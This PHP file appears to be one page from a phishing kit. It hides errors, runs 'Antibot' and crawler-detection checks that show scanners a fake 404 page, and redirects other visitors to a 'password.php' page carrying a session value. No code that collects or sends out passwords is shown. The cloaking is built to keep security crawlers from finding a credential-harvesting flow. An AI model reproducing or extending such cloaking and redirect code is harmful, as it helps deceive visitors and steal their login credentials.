<?php
error_reporting(0);

session_start();
require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkValue()) {
        echo $antibot->throw404();
        die();
    } 
    include '../../crawlerdetect.php';

$ip = $_SERVER['REMOTE_ADDR'];
$hash = $_SESSION['value']; 

header("Location: password.php?value=$hash");

?>